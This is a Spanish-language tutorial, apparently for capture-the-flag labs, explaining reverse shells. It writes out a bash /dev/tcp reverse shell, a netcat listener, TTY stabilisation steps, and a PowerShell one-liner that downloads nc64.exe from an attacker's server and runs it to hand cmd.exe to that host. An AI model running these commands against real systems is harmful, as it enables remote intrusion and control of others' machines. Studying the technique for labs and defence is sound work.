# Reverse Shell — Obtención de Acceso Remoto

## Introducción

Todas las máquinas tienen "puertas" porque se diseñaron para estar controladas. Existen dos tipos de puerta, y ambas llevan al mismo destino: el control del sistema.

- **Puerta principal**: es la puerta por la que el servicio se expone oficialmente. Puede estar en un dominio, una IP o cualquier otro punto de entrada, y normalmente está protegida por algún tipo de autenticación (usuario/contraseña, token, etc.).
- **Puerta RCE (Remote Command Execution)**: una vulnerabilidad que permite ejecutar comandos arbitrarios en el sistema. La *reverse shell* es la técnica más habitual para aprovechar un RCE y convertirlo en acceso interactivo persistente.

---

## ¿Qué es una Reverse Shell?

Una *reverse shell* invierte el sentido habitual de la conexión: en lugar de que el atacante se conecte a la máquina víctima (como haría con SSH), es la **máquina víctima la que se conecta al atacante**. Esto es especialmente útil cuando la víctima está detrás de un firewall que bloquea conexiones entrantes pero permite salientes.

### Reverse shell básica en sistemas UNIX

```bash
sh -i >& /dev/tcp/10.0.2.15/4455 0>&1
```

### Explicación de cada parte

| Componente | Significado |
|---|---|
| `sh -i` | Lanza una shell (`sh`) en modo interactivo (`-i`). |
| `>&` | Redirige tanto el **standard output** (la salida de los comandos) como el **standard error** (los mensajes de error) hacia el mismo destino. |
| `/dev/tcp/10.0.2.15/4455` | Pseudo-dispositivo de Bash que abre una conexión TCP contra la IP `10.0.2.15` en el puerto `4455`. Es lo que realmente crea el canal de red. |
| `0>&1` | Redirige el **standard input** hacia donde apunta el standard output (que ya está conectado al socket TCP). Así, todo lo que el atacante escriba en su terminal llega como entrada a la shell de la víctima. |

En conjunto, estos tres flujos (entrada, salida y errores) quedan conectados al socket TCP, lo que permite al atacante **controlar la shell de la víctima de forma remota**, como si estuviera sentado delante de esa máquina. El mismo principio funciona con `bash -i` en lugar de `sh -i`, y se puede apuntar a cualquier IP y puerto que controle el atacante.

> 📡 **Antes de ejecutar el comando en la víctima**, hay que estar escuchando en el equipo atacante con una herramienta como Netcat:
> ```bash
> nc -lvnp 4455
> ```
> - `-l`: modo *listen* (escucha).
> - `-v`: verbose, muestra información de la conexión.
> - `-n`: no resuelve DNS (más rápido).
> - `-p 4455`: puerto en el que escuchar.

---

## Convertir la shell en una TTY funcional

Una reverse shell básica suele ser una shell "no interactiva de verdad": no tiene autocompletado, no soporta bien `Ctrl+C`, y a veces ni siquiera permite usar el historial de comandos. Para solucionarlo, se estabiliza convirtiéndola en una TTY completa:

```bash
script /dev/null -c bash
```
Seguido de:

1. **`Ctrl + Z`** — Suspende la shell y la envía a segundo plano en la terminal del atacante (no del comando anterior, ¡ojo con la sintaxis!).
2. **`stty raw -echo; fg`** — Configura la terminal local en modo *raw* (sin procesar caracteres especiales) y sin *echo* (para que no se dupliquen los caracteres al escribir), y a continuación trae la shell de nuevo a primer plano (`fg`).
3. **`reset`** — Restaura y limpia la terminal, ajustando correctamente el buffer.
4. **`export TERM=xterm`** — Establece el tipo de terminal, necesario para que funcionen programas interactivos como `vim`, `nano` o `less`.

Tras estos pasos ya se puede usar `Ctrl+C`, autocompletado, editores de texto interactivos y, en general, todo lo que se esperaría de una terminal normal.


### Tabla resumen del proceso de estabilización

| Paso | Comando | Función |
|---|---|---|
| 1 | `script /dev/null -c bash` | Lanza una bash "envuelta" en una pseudo-terminal |
| 2 | `Ctrl+Z` | Suspende la shell en el atacante |
| 3 | `stty raw -echo; fg` | Ajusta la terminal local y reanuda la shell |
| 4 | `reset` | Limpia y repara el estado de la terminal |
| 5 | `export TERM=xterm` | Habilita programas interactivos (vim, nano, less...) |

---

## Ejemplo práctico contra una máquina Windows

Este escenario combina un servidor HTTP temporal (para transferir el binario) con un listener de Netcat, típico en máquinas HTB/DockerLabs con Windows.

### En el equipo atacante (2 terminales)

**Terminal 1 — Servidor HTTP** para servir el binario de Netcat a la víctima:
```bash
sudo python3 -m http.server 80
```

**Terminal 2 — Listener** que recibirá la shell, usando `rlwrap` para tener historial y edición de línea:
```bash
rlwrap nc -lvnp 4455
```

### En la terminal remota (obtenida vía RCE en la víctima)

Se aprovecha PowerShell para descargar `nc64.exe` desde el servidor del atacante y ejecutarlo apuntando de vuelta al listener:

```powershell
powershell -c "Invoke-WebRequest -Uri http://10.10.14.18/nc64.exe -OutFile C:\ProgramData\nc64.exe; C:\ProgramData\nc64.exe 10.10.14.18 4455 -e cmd.exe"
```

### Explicación de cada parte

| Componente | Significado |
|---|---|
| `powershell -c "..."` | Ejecuta el comando indicado dentro de PowerShell. |
| `Invoke-WebRequest -Uri ...` | Cmdlet de PowerShell para descargar un recurso por HTTP (equivalente a `curl`/`wget`). Descarga el binario `nc64.exe` desde el servidor Python del atacante. |
| `-OutFile C:\ProgramData\nc64.exe` | Ruta donde se guarda el archivo descargado. Se elige `C:\ProgramData` porque, por defecto, **todos los usuarios tienen permisos de escritura** en esa carpeta, lo cual es clave cuando se opera con un usuario de pocos privilegios. |
| `;` | Separador de comandos en PowerShell (permite encadenar varias instrucciones en una sola línea, igual que `;` en Bash). |
| `C:\ProgramData\nc64.exe 10.10.14.18 4455 -e cmd.exe` | Ejecuta el Netcat recién descargado, conectándose a la IP y puerto del atacante. |
| `-e cmd.exe` | Le indica a Netcat que, tras conectar, ejecute `cmd.exe` y enlace su entrada/salida al socket — esto es lo que realmente entrega la shell de Windows al atacante. |

